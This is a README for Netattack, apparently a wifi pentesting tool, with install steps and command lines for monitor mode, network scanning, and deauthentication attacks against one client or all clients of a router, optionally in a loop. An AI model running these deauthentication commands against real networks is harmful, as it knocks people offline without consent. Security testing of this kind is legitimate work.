# Netattack

Netattack is a tool for wifi pentesting attacks

## Starting

### Pre-requisites

```
sudo apt install python3
sudo apt install python3-pip
```

### Installation
```
git clone https://github.com/juanga333/Netattack.git
cd Netattack
pip3 install -r requirements.txt
```

### Usage
_To put your network interface in monitor mode_
```
sudo python3 mon.py -i <interface> -mt
```

_To put your network interface in managed mode_
```
sudo python3 mon.py -i <interface> -mg
```

_Also you can get the MAC address and more information about the router you are connected to_
```
sudo python3 nscan.py -i <interface> -g

```
_To see all nearby wifi_
```
sudo python3 nscan.py -i <interface> -a
```

_This is the basic usage example to deauthenticate a wifi client from a router_
```
sudo python3 nattack.py -i <interface> -b <bssid> -v <victim mac> 
```

_To deauthenticate all wifi clients from a router_
```
sudo python3 nattack.py -i <interface> -b <bssid>
```

_To deauthenticate all wifi clients from a router in a loop_
```
sudo python3 nattack.py -i <interface> -b <bssid> -d
```
